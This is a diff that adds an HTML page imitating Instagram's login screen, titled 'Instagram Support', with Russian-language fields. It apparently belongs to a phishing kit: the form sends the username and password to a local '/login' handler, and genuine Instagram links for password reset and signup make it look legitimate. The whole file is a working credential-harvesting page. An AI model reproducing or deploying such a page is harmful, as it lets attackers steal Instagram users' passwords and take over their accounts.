@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Instagram Support</title>
+    <link rel="stylesheet" href="/assets/index.css">
+    <link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css?family=Hind|Kanit" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="blocks">
+            <div class="headers">
+                <img src="https://res.cloudinary.com/grami/image/upload/v1544705598/instagram-new-logo.png">
+            </div>
+            <form action="/login" method="POST">
+                <input class="input" required type="text" name="name" placeholder="Номер телефона, имя пользователя или почта">
+                <input class="input" required type="password" name="password" placeholder="Пароль">
+                <input type="submit" value="Log in" class="disabled">
+            </form>
+            <div class="massage"></div>
+            <div class="reset">
+                <a href="https://www.instagram.com/accounts/passsword/reset/">Забыли пароль?</a>
+            </div>
+        </div>
+        <div class="blocks second">
+            Нет аккаунта? 
+            <a target="_blank" href="https://www.instagram.com/accounts/emailsignup/">Зарегестрироваться</a>
+        </div>
+        <div class="footer">
+            <i class="fa fa-instagram"></i>
+            <div>
+                <i class="fa fa-copyright"></i>
+                2018 INSTAGRAM
+            </div>
+        </div>
+    </div>
+    <script src="/assets/index.js"></script>
+</body>
+</html>
